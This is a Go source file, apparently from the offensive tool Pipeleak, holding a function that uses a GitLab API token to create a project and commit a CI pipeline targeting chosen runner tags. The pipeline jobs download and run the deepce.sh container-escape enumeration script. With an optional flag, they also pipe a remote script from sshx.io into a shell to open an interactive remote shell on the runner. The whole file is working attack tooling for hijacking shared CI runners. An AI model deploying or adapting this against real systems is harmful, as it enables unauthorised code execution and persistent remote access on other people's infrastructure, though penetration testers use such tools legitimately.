package gitlab

import (
	"github.com/rs/zerolog/log"
	gogit "github.com/xanzy/go-gitlab"
	ci "gitlab.com/mitchenielsen/gitlab-ci-go"
)

func ExploitRunners(runnerTags []string, dry bool, shell bool, gitlabApiToken string, gitlabUrl string) {

	gitlabCiYml := generateCIYml(runnerTags, shell)

	if dry {
		log.Info().Msg("Generated .gitlab-ci.yml")
		log.Info().Msg(gitlabCiYml)
		log.Info().Msg("Create you project and .gitlab-ci.yml manually")
		return
	}

	git, err := gogit.NewClient(gitlabApiToken, gogit.WithBaseURL(gitlabUrl))
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitlab client")
	}

	opts := &gogit.CreateProjectOptions{
		Name:        gogit.Ptr("pipeleak-runner-exploit"),
		JobsEnabled: gogit.Ptr(true),
	}

	project, _, err := git.Projects.CreateProject(opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating project")
	}

	log.Info().Str("name", project.Name).Str("url", project.WebURL).Msg("Created project")

	fileOpts := &gogit.CreateFileOptions{
		Branch:        gogit.Ptr("main"),
		Content:       gogit.Ptr(gitlabCiYml),
		CommitMessage: gogit.Ptr("Pipeleak create .gitlab-ci.yml"),
	}
	fileInfo, _, err := git.RepositoryFiles.CreateFile(project.ID, ".gitlab-ci.yml", fileOpts)

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Creating .gitlab-ci.yml failed")
	}

	log.Info().Str("file", fileInfo.FilePath).Msg("Created .gitlab-ci.yml")
	log.Info().Str("url", project.WebURL+"/-/pipelines").Msg("Check pipelines logs manually")
	log.Info().Msg("Make sure to delete the prject when done")
}

func generateCIYml(runnerTags []string, shell bool) string {
	yml := ci.CI{
		Globals: ci.Globals{Stages: []string{"exploit"}},
		Jobs:    map[string]ci.JobConfig{},
	}

	for _, tag := range runnerTags {
		script := []string{
			"echo \"Pipeleak exploit job\"",
			"id",
			"whoami",
			"curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh",
			"chmod +x deepce.sh",
			"./deepce.sh",
		}

		job := ci.JobConfig{
			Stage:        "exploit",
			Image:        "ubuntu:latest",
			Tags:         []string{tag},
			BeforeScript: []string{"apt update && apt install curl -y"},
			Script:       script,
		}

		if shell {
			job.Script = append(job.Script, "curl -sSf https://sshx.io/get | sh -s run")
		}
		yml.Jobs["pipleak-job-"+tag] = job

	}

	yamlData, err := yml.Build()

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed marshalling yml")
	}

	return string(yamlData)
}
